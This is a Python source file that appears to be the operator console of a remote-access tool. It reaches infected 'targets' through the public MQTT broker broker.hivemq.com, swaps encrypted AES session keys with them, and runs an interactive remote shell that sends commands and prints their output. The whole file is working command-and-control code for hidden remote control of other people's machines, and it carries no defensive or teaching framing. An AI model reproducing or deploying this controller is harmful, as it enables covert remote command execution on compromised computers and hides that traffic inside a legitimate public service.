#control_2.py
import paho.mqtt.client as mqtt
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64
import uuid
import json
import os
import sys
import threading
import time
from pick import pick

PUBLIC_KEY_B64 = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE1MEJGQkJaZTc5RzFFT2xnMjRLYwp2d2kxZ05xb1JyOS8zRHpGSVVRVkhiRGdMZnF0NDdEODB4eTV6alREZ2M5ZkZ4OER3bGRFVFNvcjRXV0VNczhxCmgydGZwSWFhMlRPZXNMU0pCdDRieFdEcVY0ZVRnRnBsRG1lK0VKZkVFWTliaE9JcEF3UWZLMllFbnZndEFRT2gKaEZ1L3o0ekI5TUdNNWQxYlBDS0pUbnhZM2VNeDVxbUVEeHJuWks3VkRGVFFoUytrQWQwc1NSQ1JydTFPL2RQLwpOTjlHVDNmSVpXeXdPc1JmQmlQTHh0NitySnVXc05jcklNeUs0bVpJZ1QzcHBnVlRQVHdXR1BHRlovQ08vUFl2Ckd5RW00eGV0THIvSnZFM2FjNTNrNSs4WUVQcVA4eHo4WnZXR2dmOEhrVkNKUmNwZTNkR2wrUkI1bEJEVUVMVVIKS1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"  # ← 替换为你生成的（和上面配对！）


public_key_data = base64.b64decode(PUBLIC_KEY_B64)
public_key = RSA.import_key(public_key_data)
rsa_encryptor = PKCS1_OAEP.new(public_key)

broker = "broker.hivemq.com"
port = 1883
topic = "FCTRL/secure"
connected = False

current_target = ""
current_session = ""
valid_targets = {}
await_confirm = []
target_session_key = {}

def encrypt_message(message: str, key: bytes):
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(message.encode("utf-8"), AES.block_size))
    return base64.b64encode(iv + encrypted).decode("utf-8")

def decrypt_message(encrypted_message: str, key: bytes):
    try:
        data = base64.b64decode(encrypted_message)
        iv = data[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data[16:])
        pad_len = decrypted[-1]
        return decrypted[:-pad_len].decode("utf-8")
    except:
        return None

def publish_encrypted(client, msg_dict, target):
    if target in target_session_key:
        encrypted = encrypt_message(json.dumps(msg_dict), target_session_key[target])
        client.publish(topic, encrypted)

def on_connect(client, userdata, flags, rc):
    global connected
    connected = True

def on_message(client, userdata, msg):
    global current_target, current_session, await_confirm, valid_targets

    decrypted = None
    for tgt, key in target_session_key.items():
        d = decrypt_message(msg.payload.decode(), key)
        if d:
            decrypted = d
            break

    if not decrypted:
        return

    try:
        j = json.loads(decrypted)
        t = j.get("type")
        if t == "status":
            valid_targets[j["client"]] = 10
        elif t == "confirm_session":
            if j["message_id"] in await_confirm:
                await_confirm.remove(j["message_id"])
                current_session = j["session_id"]
                publish_encrypted(client, {
                    "type": "start_session",
                    "target": current_target,
                    "session_id": current_session
                }, current_target)
                print("[+] Generating shell")
        elif t == "cmdoutput" and j.get("session_id") == current_session:
            print(j["output"], end="", flush=True)
        elif t == "end_session" and j.get("session_id") == current_session:
            print("\n\n[-] Session ended\ncontinue> ", end="", flush=True)
            current_target = ""
            current_session = ""
    except:
        pass

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

while True:
    try:
        client.connect(broker, port, 60)
        break
    except:
        time.sleep(5)

client.loop_start()

def verify_status():
    global valid_targets, current_target, current_session
    while True:
        for tgt in list(valid_targets):
            valid_targets[tgt] -= 1
            if valid_targets[tgt] < 0:
                valid_targets.pop(tgt, None)
                if current_target == tgt:
                    current_target = ""
                    current_session = ""
                    print("\n\n[-] Target lost\ncontinue> ", end="", flush=True)
        time.sleep(0.5)

threading.Thread(target=verify_status, daemon=True).start()

while not connected:
    time.sleep(0.1)

try:
    while True:
        if current_target and current_target in valid_targets:
            cmd = input()
            publish_encrypted(client, {
                "type": "cmd_input",
                "target": current_target,
                "session_id": current_session,
                "input": cmd
            }, current_target)
            if cmd.strip().lower() == "exit":
                current_target = current_session = ""
                os.system("cls" if os.name == "nt" else "clear")
        else:
            os.system("cls" if os.name == "nt" else "clear")
            picks = ["update", "config", "exit"] + list(valid_targets)
            opt, _ = pick(picks, title=f"FCTRL ({len(valid_targets)} targets)")

            if opt in ("update", "config"):
                pass
            elif opt == "exit":
                break
            else:
                target = opt
                aes_key = get_random_bytes(16)
                target_session_key[target] = aes_key

                
                encrypted_key = rsa_encryptor.encrypt(aes_key)
                client.publish(topic, base64.b64encode(encrypted_key).decode())

                time.sleep(0.5)

                msg_id = uuid.uuid4().hex
                await_confirm.append(msg_id)
                publish_encrypted(client, {
                    "type": "new_session",
                    "target": target,
                    "message_id": msg_id
                }, target)

                for _ in range(10):
                    time.sleep(0.5)
                    if current_session:
                        break

                if current_session:
                    current_target = target
                    os.system("cls" if os.name == "nt" else "clear")
                    print("[+] Connected")
                else:
                    print("[-] Failed")
                    input("continue> ")
except KeyboardInterrupt:
    pass
finally:
    client.loop_stop()
    client.disconnect()